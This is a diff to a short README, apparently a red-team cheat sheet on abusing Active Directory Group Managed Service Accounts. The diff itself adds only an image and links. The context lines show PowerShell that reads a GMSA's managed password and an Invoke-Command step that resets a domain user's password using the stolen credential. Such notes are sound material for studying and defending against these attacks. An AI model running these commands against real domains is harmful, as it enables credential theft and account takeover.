@@ -3,6 +3,8 @@ Retrieve passwords from Group Managed Service Accounts (GMSA) that you have Read
 
 If the user you have owned has ReadGMSAPassword permissions over a GMSA you are able to retreive this users password.
 
+<img src="https://raw.githubusercontent.com/glowbase/group-managed-service-accounts/main/20220809203905465.png" width="500px" />
+
 ```powershell
 $gmsa = Get-ADServiceAccount -Identity 'GMSA-USER' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'
@@ -22,3 +24,7 @@ Execute commands via `Invoke-Command` as GMSA.
 ```powershell
 Invoke-Command -ComputerName COMPUTER_NAME -Credential $cred -ScriptBlock {net user someuser password123! /domain}
 ```
+
+## Additional Resources
+- Additional GMSA Attacks - [https://adsecurity.org/?p=4367](https://adsecurity.org/?p=4367)
+- Overview of GMSA - [https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
